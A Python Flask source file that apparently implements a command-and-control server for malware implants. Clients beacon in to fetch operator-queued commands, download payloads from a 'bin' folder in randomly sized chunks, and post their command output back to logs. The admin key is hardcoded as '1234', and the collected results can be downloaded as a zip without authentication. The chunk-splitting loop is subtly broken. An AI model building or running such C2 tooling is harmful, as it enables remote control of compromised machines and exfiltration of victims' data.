from flask import Flask, make_response, send_file, request, jsonify, abort
import os
from collections import deque
from datetime import datetime
import shutil
import random
import string
import time
import io

app = Flask(__name__)
client_dict = {}

PAYLOADS_DIR = os.path.join(os.path.dirname(__file__), 'bin')
LOGS_DIR = os.path.join(os.path.dirname(__file__), 'logs')

ADMIN_KEY = "1234"

@app.before_request
def check_admin_key():
    if request.path.startswith('/admin'):
        admin_key = request.headers.get('X-Key')
        if admin_key != ADMIN_KEY:
            abort(403)

@app.route("/admin/get_clients", methods=['GET'])
def get_clients():
    
    data = {}
    
    for client in client_dict.keys():
        data[client] = {}
        data[client]['Last Seen'] = client_dict[client]['Last Seen']
    
    return make_response(data, 200)

@app.route("/admin/add", methods = ['POST'])
def add_to_queue():
    data = request.json
    
    if 'X-Client-ID' not in data:
        return make_response("", 400)
    
    client_id = data['X-Client-ID']
    if client_id not in client_dict.keys():
        return make_response("", 404)
    
    if 'type' in data and 'url' in data and 'command' in data:
        
        client_queue = client_dict[client_id]["Queue"]
        
        del data["X-Client-ID"]
        client_queue.append(data)
        return make_response("", 201)
    else:
        return make_response("", 400)





def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def get_timestamp():
    return f"{datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}"
    

def init_new_client(client_id):
    client_dict[client_id] = {"Queue": deque()}
    set_last_seen(client_id)

def set_last_seen(client_id):
    client_dict[client_id]['Last Seen'] = get_timestamp()
    

@app.route("/", methods = ['GET'])
def root():
    
    client_id = request.headers.get('X-Client-ID')
    
    # Initialize client if no id set.
    if not client_id:
        response = make_response("", 200)
        client_id = generate_random_string(8)
        response.headers.add("X-Client-ID", client_id)
        
        
        init_new_client(client_id)
        
        return response
    
    
    
    client_queue: deque = client_dict[client_id]['Queue']
    set_last_seen(client_id)
    
    # No content
    if not len(client_queue):
        return make_response("", 204)
    
    command = client_queue.popleft()
    
    return make_response(command, 200)
    

def split_file(filename):
    filepath = os.path.join(PAYLOADS_DIR, filename)
    
    with open(filepath, "rb") as file:
        content = file.read()
        
    size = len(content)
    
    if size < 1024:
        return content
    
    i1 = random.randint(240,300)
    
    # SPLIT FILE
    chunks = [ content[:i1] ]
    
    while( size > 0 ):
        chunk_len = random.randint(min(256, size), min(1024,size))
        
        i2 = i1 + chunk_len
        
        chunks.append( content[i1:i2] )
        size = size - chunk_len
    
    return chunks

    
@app.route("/download/<filename>", methods = ['GET'])
def download_file(filename):
    chunks = split_file(filename)
    
    def generate():
        for chunk in chunks:
            # time.sleep(random.randint(1,3))
            yield chunk
    
    return generate(), {"Content-Type": "application/octet-stream"}

    
@app.route("/results", methods = ["POST"])
def save_results():
    data = request.data
    
    filename = f"{get_timestamp()}.txt"
    
    filepath = os.path.join(LOGS_DIR, filename)
    
    with open(filepath, "w") as file:
        file.write(data.decode('utf-8'))
        
    return make_response("", 201)

@app.route("/get_results", methods = ['GET'])
def get_results():
    shutil.make_archive("logs", 'zip', LOGS_DIR)
    response = send_file("logs.zip")
    
    return make_response(response, 200)